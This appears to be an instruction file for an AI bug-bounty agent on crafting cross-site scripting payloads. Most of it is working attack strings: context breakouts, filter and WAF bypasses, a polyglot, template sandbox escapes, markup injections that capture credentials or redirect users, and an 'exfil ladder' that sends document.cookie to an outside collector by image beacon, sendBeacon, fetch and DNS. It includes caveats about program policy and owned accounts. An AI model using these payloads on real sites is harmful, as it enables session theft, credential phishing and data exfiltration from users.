# Payload Construction — context breakouts, filter bypasses, and CSP-aware blind evidence

Read `discovery-context-encoding.md` before selecting anything in this file. These vectors are preserved from the previous skill, but none is universal: confirm the exact parser context, browser behavior, transformations, CSP, Trusted Types state, and delivery path. Use a local execution marker for visible reflected or DOM cases; reserve `//xss.report/c/d0x/` for blind or delayed observation.

**Safety precedence:** examples that read `document.cookie`, DOM, storage, tokens, internal responses, or other sensitive material are permitted only with d0x-controlled accounts, sessions, objects, and data under the current program policy. For an unowned blind renderer, use an attribution-only tag or stop at the policy boundary; never collect or replay third-party credentials, PII, or private content.

## Contents

- Primary + context breakouts (walk in this order per point)
- When `script`/`svg`/`img` is stripped — alternate tags & events
- Calling a function without `(` — the invocation bypasses
- When script is impossible — markup-only injection still converts
- Filter / encoding bypasses (in order)
- CSTI — template injection that escapes to XSS
- CSP-aware exfil ladder — make the callback land under a strict policy

All preserved blind payloads call back to d0x's channel `//xss.report/c/d0x/`. Append a `?src=<tag>` to every one so the landed hit maps to the input (see `callback-setup.md`). `import('//xss.report/c/d0x/')` can load the channel's module only when the effective CSP, cross-origin module CORS/MIME behavior, and network path all permit it. When it does not load, first use a local execution control; only then test the least-sensitive policy-permitted evidence channel at the bottom.

## Primary + context breakouts (walk in this order per point)

```html
<!-- HTML body (free text) -->
<svg/onload=import('//xss.report/c/d0x/?src=TAG')>
<img src=x onerror=import('//xss.report/c/d0x/?src=TAG')>

<!-- Double-quoted attribute -->
"><svg onload=import('//xss.report/c/d0x/?src=TAG')>
<!-- Single-quoted attribute -->
'><svg onload=import('//xss.report/c/d0x/?src=TAG')>
<!-- Attribute injection WITHOUT breakout (value lands inside a tag) -->
" onmouseover="import('//xss.report/c/d0x/?src=TAG')" x="
" autofocus onfocus="import('//xss.report/c/d0x/?src=TAG')

<!-- Element-close breakouts -->
</title><svg onload=import('//xss.report/c/d0x/?src=TAG')>
</textarea><svg onload=import('//xss.report/c/d0x/?src=TAG')>
</style><svg onload=import('//xss.report/c/d0x/?src=TAG')>
</noscript><svg onload=import('//xss.report/c/d0x/?src=TAG')>
</script><svg onload=import('//xss.report/c/d0x/?src=TAG')>

<!-- href / src sink -->
javascript:import('//xss.report/c/d0x/?src=TAG')

<!-- JS string context (value interpolated into inline JS) -->
';import('//xss.report/c/d0x/?src=TAG');//
</script><svg onload=import('//xss.report/c/d0x/?src=TAG')>
<!-- template-literal context -->
${import('//xss.report/c/d0x/?src=TAG')}

<!-- iframe srcdoc (double-encode inner quotes) -->
<iframe srcdoc='<svg/onload=import("//xss.report/c/d0x/?src=TAG")>'></iframe>

<!-- classic script tag when raw HTML is stored (CKEditor/TinyMCE staff views) -->
<script src=//xss.report/c/d0x/?src=TAG></script>
```

Markdown-rendered fields (many admin comment/ticket tools):

```markdown
[click](<javascript:import('//xss.report/c/d0x/?src=TAG')>) ![x](<javascript:import('//xss.report/c/d0x/?src=TAG')>)
```

## When `script`/`svg`/`img` is stripped — alternate tags & events

Filters that blacklist a couple of tags almost always miss these:

```html
<details open ontoggle=import('//xss.report/c/d0x/?src=TAG')>
<video><source onerror=import('//xss.report/c/d0x/?src=TAG')>
<audio src onerror=import('//xss.report/c/d0x/?src=TAG')>
<body onload=import('//xss.report/c/d0x/?src=TAG')>
<marquee onstart=import('//xss.report/c/d0x/?src=TAG')>
<input autofocus onfocus=import('//xss.report/c/d0x/?src=TAG')>
<select autofocus onfocus=import('//xss.report/c/d0x/?src=TAG')>
<form><button formaction=javascript:import('//xss.report/c/d0x/?src=TAG')>x
<object data=//xss.report/c/d0x/?src=TAG>
<math><mtext><script>import('//xss.report/c/d0x/?src=TAG')</script>
```

## Calling a function without `(` — the invocation bypasses

Filters and WAFs match the _call_, not the function: `alert(`, `confirm(`, `document.cookie`. Change how the call is written and the signature stops matching while the JavaScript stays valid. These belong in every JS-context and attribute-context payload, and they are what carried several corpus reflected-XSS reports past filters that had already stopped the obvious forms:

```js
confirm`d0x`; // tagged template — no parentheses at all
alert?.(document.cookie)(
  // optional chaining — the call operator is `?.(`, not `(`
  confirm,
)(1); // parenthesised reference — breaks `confirm(` as a literal string
window["al" + "ert"](1); // split property name — beats any substring match
eval.call`${"alert(1)"}`; // when even the name is filtered
```

**In a JS string context, break out with an arithmetic operator, not a statement separator.** The reflection usually sits inside a quoted value in an object literal, where `;` is a syntax error and gets you nothing:

```js
$.msg_board({ control: "<HERE>", dealerid: "" });
```

```
1'-confirm`d0x`-'          // the value becomes '1' - confirm`d0x` - '' — valid, and it runs
2"-confirm`d0x`-"          // same for a double-quoted context
```

The expression stays syntactically whole, so nothing downstream breaks and the payload fires on load with no interaction. Two corpus reports on the same SSO host landed this on two different parameters — when one reflection works, try every other parameter on that page before moving on.

**In an attribute context, make the element focusable and fire on focus.** The classic `" autofocus onfocus=` only works on natively focusable elements; `contenteditable` makes _any_ element focusable, and `onfocusin` fires where `onfocus` may not:

```
1')"AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//
```

Four bypasses stacked in one string, and every one of them is load-bearing: `/` as the attribute separator (defeats space filtering), mixed case (defeats case-sensitive matching), `(confirm)(1)` (defeats call-signature matching), and the trailing `//` to comment out the rest of the original attribute instead of having to re-balance it.

**When you cannot tell the context, close several at once.** A shotgun prefix costs one request and tells you which context you were in from what renders:

```
">>>>>><marquee>PROBE</marquee></head><x></script><script>import('//xss.report/c/d0x/?src=TAG')</script><meta
```

**A redirect parameter that takes `javascript:` is XSS, not an open redirect.** Any `*redirect*`, `*return*`, `*next*`, `*continue*`, `*_url` parameter whose value reaches an `href`/`location` should be probed with `javascript:import('//xss.report/c/d0x/?src=TAG')` before it is filed as a redirect — the severity is entirely different, and marketing/form platforms (Pardot `go.<brand>.com/l/<id>/…` pages and similar) are a recurring home for it.

**Corpus cases (all reflected, all filter-driven):** `3444814` — `h1/reports/3444814-assurant-duplicate.md` and `3568707`/`3568960` — `h1/reports/3568707-starbucks-duplicate.md`, `h1/reports/3568960-starbucks-duplicate.md` (the arithmetic + backtick JS-string breakout, twice on one host). `3505362` — `h1/reports/3505362-itau_unibanco-resolved.md` (**resolved**; the `AutoFocus/ContentEditable/OnFocusIn` attribute stack). `3532127` — `h1/reports/3532127-flutteruki-duplicate.md` (`</textarea>` out of a JSON blob, plus `alert?.()`). `3630129` — `h1/reports/3630129-aer_lingus_vdp-pending-program-review.md` (the multi-context shotgun). `3485718` — `h1/reports/3485718-adjust-duplicate.md` (`javascript:` in a redirect parameter). `3435792` — `h1/reports/3435792-wbd_private-triaged.md` (plain attribute escape).

## Filter / encoding bypasses (in order)

1. **Case** — `<SvG oNlOaD=import('//xss.report/c/d0x/?src=TAG')>`.
2. **Whitespace / separator** — swap the space for a tab/newline/slash/formfeed: `<svg%09onload=...>`, `<svg%0aonload=...>`, `<svg/onload=...>`, `<svg%0conload=...>`. Also between the attr and `=`: `<svg onload%09=...>`.
3. **Nested / self-closing tag to defeat a single-pass strip** — the filter removes the inner match and re-forms the payload: `<scr<script>ipt>import('//xss.report/c/d0x/?src=TAG')</scr</script>ipt>`, `<sv<svg>g/onload=import('//xss.report/c/d0x/?src=TAG')>`.
4. **HTML-entity encoding** (server often decodes before render) — `&lt;svg/onload=import('//xss.report/c/d0x/?src=TAG')&gt;`, or numeric `&#60;svg...&#62;` / `&#x3c;svg...&#x3e;`. Encode just the payload's `<`/`>`.
5. **Double URL-encoding** for values that pass through two decoders — `%253Csvg%2520onload%253D...%253E`.
6. **Unicode normalisation / fullwidth** for stacks that NFKC-fold — `＜svg/onload=import('//xss.report/c/d0x/?src=TAG')＞`; also overlong/homoglyph `ｊａｖａｓｃｒｉｐｔ:` for `javascript:` schemes that are keyword-filtered.
7. **Null / control-char insertion** — `<svg/on\x00load=...>` / `java\tscript:` to split a keyword blacklist (legacy parsers).
8. **Polyglot** — one string that fires across body/attribute/JS at once:
   ```
   jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=import('//xss.report/c/d0x/?src=TAG') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloaD=import('//xss.report/c/d0x/?src=TAG')//>
   ```
9. **Markdown injection** where HTML is filtered but markdown→HTML is allowed (see the markdown block above).

## CSTI — template injection that escapes to XSS

If the field lands in a client-side template (Angular / Vue / older AngularJS), the value is evaluated, so `{{ }}` reaches JS via a sandbox escape:

```html
<!-- AngularJS 1.x sandbox escape -->
{{constructor.constructor('import("//xss.report/c/d0x/?src=TAG")')()}}
<!-- Vue 2 -->
{{_c.constructor('import("//xss.report/c/d0x/?src=TAG")')()}}
<!-- Vue 3 -->
{{$emit.constructor('import("//xss.report/c/d0x/?src=TAG")')()}}
```

Probe first with `{{7*7}}` → renders `49` = template context confirmed, then swap in the escape. Server-side template contexts (SSTI) are RCE, not XSS — hand those to `rce-hunting`.

## When script is impossible — markup-only injection still converts

Everything above chases execution. When the sanitizer strips tags and event handlers, or the CSP genuinely blocks every script vector, the usual move is to close the lead. Do one thing first: check whether **plain markup** still lands. Injecting HTML without any script is a different bug with a different defence surface, and it converts — a corpus report of exactly this shape closed **resolved**.

The reason it survives is that almost nothing built to stop XSS looks at it. `script-src` is irrelevant. WAF signatures key on `<script`, `on*=`, `javascript:`. Sanitizers that strip dangerous tags frequently allow `<a>`, `<form>`, `<img>`, `<meta>` and inline `style`.

| Payload | What it does | The CSP directive that would stop it |
| --- | --- | --- |
| `<a href="//attacker" style="display:inline-block;padding:8px 14px;background:#0033cc;color:#fff;font-weight:bold;border-radius:4px">Continue</a>` | a native-looking button on the target's own page, sending the victim off-origin on click | **none** — no directive governs link targets |
| `<form action="//attacker/collect" method="POST">` injected above the real form | the victim's credentials POST to you; the page still looks correct | `form-action` |
| `<meta http-equiv="refresh" content="0;url=//attacker">` | navigation with no script and no click | **none in mainstream CSP** |
| `<base href="//attacker/">` | repoints every _relative_ URL on the page — scripts, forms, links — at once | `base-uri` |
| `<img src="//attacker/?t=" width=0 height=0>` | a beacon proving injection fires in the viewer's browser; the safe first probe | `img-src` |
| `<iframe src="//attacker" style="position:fixed;inset:0;width:100%;height:100%;border:0">` | full-page overlay inside the trusted origin | `frame-src` / `child-src` |

**So read the CSP for the directives that actually apply here**, not for `script-src`:

```bash
curl -sD - -o /dev/null "$URL" | grep -i 'content-security-policy' \
  | tr ';' '\n' | grep -iE 'form-action|base-uri|img-src|frame-src|default-src'
```

A policy with a locked-down `script-src` and **no `form-action` and no `base-uri`** is the common case, and it is fully exposed to rows 2 and 4.

**Dangling markup** (`<img src='//attacker/?` left unterminated, swallowing page content up to the next quote) belongs to this family and is the one to be careful about: Chrome and Firefox added mitigations that drop resource loads whose URL carries raw newlines or `<`, so it fails in many modern contexts. Try it, but never report it on theory — the callback either arrives with the stolen content in it or the technique did not work.

**Recognize the surface.** Error and message renderers are the classic home: a servlet or framework error page that reflects `msg` / `message` / `error` / `reason` / `errorMsg` / `info` into the body, reached by a URL anyone can send. These pages are rarely reviewed and rarely sanitized because "it only shows an error".

**Grade it honestly.** The impact is a credible phishing or credential-capture surface _hosted on the target's origin_, and its weight comes from how much that origin is trusted — a government, banking, or SSO host carries it; a marketing microsite does not. Prove the markup renders, show the styled result, and stop. It is Low-to-Medium, it is not XSS, and claiming session theft you did not achieve is what turns a resolvable finding into an informative one.

**Corpus case:** `3435448` — `h1/reports/3435448-deptofdefense-resolved.md` (low · **resolved**; a styled `<a>` injected into a servlet error page's `msg` parameter on a high-trust domain).

## CSP-aware exfil ladder — make the callback land under a strict policy

`import()` needs `script-src` to permit `xss.report`. When it doesn't, the DOM/ cookie is still readable inside the fired document — exfil through whatever egress the policy still allows. Walk down until one lands:

1. **Module import** (default) — `import('//xss.report/c/d0x/?src=TAG')`. Loads the full collector.
2. **Image beacon** (needs only `img-src`, or bypasses `connect-src`):
   ```js
   new Image().src =
     "//xss.report/c/d0x/?src=TAG&c=" + encodeURIComponent(document.cookie);
   ```
3. **sendBeacon** (fires on unload, survives navigation; needs `connect-src`):
   ```js
   navigator.sendBeacon("//xss.report/c/d0x/?src=TAG", document.cookie);
   ```
4. **no-cors fetch** (POST the body even cross-origin; `connect-src`):
   ```js
   fetch("//xss.report/c/d0x/?src=TAG", {
     method: "POST",
     mode: "no-cors",
     body: document.cookie,
   });
   ```
5. **CSS/link exfil** when only `style-src`/`default-src` for stylesheets is allowed — inject a `<link rel=stylesheet href=//xss.report/c/d0x/?src=TAG>` to at least prove render-context reach (DNS/HTTP hit, no DOM).
6. **DNS-attributed resource proof** when a policy-permitted resource request reaches the resolver but its HTTP connection does not complete — encode only a controlled origin/tag as a subdomain. CSP may block a resource before DNS resolution, so absence of a lookup proves nothing. `interactsh-client` is installed (`~/go/bin/interactsh-client`, not on PATH); run it first and use the domain it prints as `<uniq>`:
   ```bash
   ~/go/bin/interactsh-client -v          # prints <uniq>.<oast-domain> and logs each DNS/HTTP hit
   ```
   ```js
   import("//" + location.hostname + ".<uniq>.<oast-domain>/");
   new Image().src = "//" + document.domain + ".<uniq>.<oast-domain>/";
   ```
   A correctly attributed DNS hit can prove the controlled expression or resource request ran in the observed origin. Never place third-party cookies, tokens, DOM, storage, PII, or private content in DNS labels; use only controlled canaries and data.

Report the lowest rung that landed and what it captured (full DOM+cookie via import, cookie-only via beacon, or render-proof-only via DNS). Even a render-proof-only hit from an admin origin is a real stored XSS — you then chain the same-session internal read in `escalation.md` to get the payable impact.
